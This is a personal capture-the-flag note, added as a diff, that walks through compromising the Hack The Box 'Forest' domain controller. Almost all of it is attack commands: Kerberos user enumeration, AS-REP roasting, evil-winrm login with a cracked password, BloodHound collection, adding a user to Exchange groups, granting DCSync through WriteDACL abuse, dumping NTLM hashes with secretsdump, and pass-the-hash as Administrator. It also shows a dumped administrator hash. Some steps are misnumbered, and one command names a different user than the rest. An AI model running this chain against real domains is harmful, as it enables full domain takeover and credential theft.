@@ -1,0 +1,79 @@
+User
+----
+1) enumerate user with nmap <kerberos server>
+nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=htb.local,userdb=/root/user -oA /root/htb/boxes/forest/nmap/kerberosUsr 10.10.10.161
+
+2) get account hash of vulnerable to ASREPRoast
+ python GetNPUsers.py htb.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+
+3) hashcat crack the hash, login using evil-winrm via 5985 port
+evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161 -P 5985
+
+Root
+----
+1) connect to port 5985 (Microsoft HTTPAPI httpd 2.0) using evil-winrm
+
+evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161 -P 5985
+
+1.25) some evil-winrm commands
+menu
+upload <localDir> <remoteDir>
+download <remoteDir> <localDir>
+
+upload /root/script/SharpHound.ps1 .
+
+1.5) Import Modules
+Import-module ./SharpHound.ps1
+Import-module ./PowerView.ps1
+
+1.6) Export bloodhound graph
+Invoke-BloodHound -LDAPUser svc-alfresco -LDAPPass s3rvice -CollectionMethod All
+//found that svc-alfresco have Exchange Windows Permissions that have writedacl priv to htb.local
+
+2) Create new AD User
+$pw = <password> | ConvertTo-SecureString -AsPlainText -Force
+new-LocalUser <Username> -Password $pw -Fullname "FullName" -Description "Description"
+
+/*
+$pw = "tester123" | ConvertTo-SecureString -AsPlainText -Force
+new-LocalUser tester67 -Password $pw -Fullname "FullName" -Description "Description"
+*/
+
+3)add newAD user for remote access(for winrm)
+net localgroup "Remote Management Users" /add tester67
+
+4)add newAD user into Exchange Windows Permissions
+net group "Exchange Windows Permissions" /add tester67
+
+5)login into tester67 with evil-winrm
+6) import powerview.ps1 and use add-domainobjectacl to abuse writedacl(gain dcsync priv)
+Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity tester15 -Rights DCSync -verbose
+7) secretsdump.py to dump ntlm hash
+python secretsdump.py -just-dc-ntlm htb.local/tester67@10.10.10.161
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+
+8) evil-winrm -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -i 10.10.10.161 -P 5985
+
+9)Grab rootFlag!
+
+
+//etc...
+
+net group "Exchange Windows Permissions" /add <username>
+net group "Exchange Trusted Subsystem" /add <username>
+net group "Exchange Servers" /add <username>
+
+3) dump bloodhound result
+Invoke-BloodHound -LDAPUser svc-alfresco -LDAPPass s3rvice -CollectionMethod All  
+
+3)Use this to escalate privilege
+aclpwn -f tester67 -ft user -d htb.local -a dijkstra -u tester67 -p tester12345 -s 10.10.10.161 
+
+4) secretsdump.py to dump ntlm hash
+
+python secretsdump.py -just-dc-ntlm htb.local/tester67@10.10.10.161
+
+5) evil-winrm -u Administrator -H <hash> -i 10.10.10.161 -P 5985
+
+
+
